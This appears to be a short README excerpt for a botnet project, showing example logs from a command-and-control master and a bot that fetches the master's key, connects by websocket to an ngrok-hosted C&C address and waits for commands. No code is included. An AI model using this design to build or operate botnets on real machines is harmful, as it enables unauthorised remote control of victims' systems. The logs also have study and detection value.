## Botnet: c&c server, bots, and bot-master CLI

Example Master Behavior:


```
2019/05/24 01:28:49 [master] published public key:
-----BEGIN PUBLIC KEY-----
( OMMITED TO SAVE SPACE )
-----END PUBLIC KEY-----
2019/05/24 01:28:49 [sslmgr] serving http at :80
2019/05/24 01:28:58 [0751c84d-8a6f-4206-9351-796697f48693] joined net
2019/05/24 01:30:38 [8f4c7cc6-8354-42c5-9ba5-39aa7d403319] joined net
```

Example Slave Behavior:

```
2019/05/24 01:30:34 [slave] fetched master public key:
-----BEGIN PUBLIC KEY-----
( OMMITED TO SAVE SPACE )
-----END PUBLIC KEY-----
2019/05/24 01:30:38 [slave] initiated websockets connection to command and control server at: ws://de6479f2.ngrok.io/join
2019/05/24 01:30:38 [slave] built and encrypted botnet join request with master key...
2019/05/24 01:30:38 [slave] sent encrypted join request to command and control server...
2019/05/24 01:30:38 [slave] waiting for command and control...
2019/05/24 01:30:38 [master] WELCOME!!! joined botnet at unix time: 1558661438413901900
2019/05/24 01:30:38 [slave] waiting for command and control...
```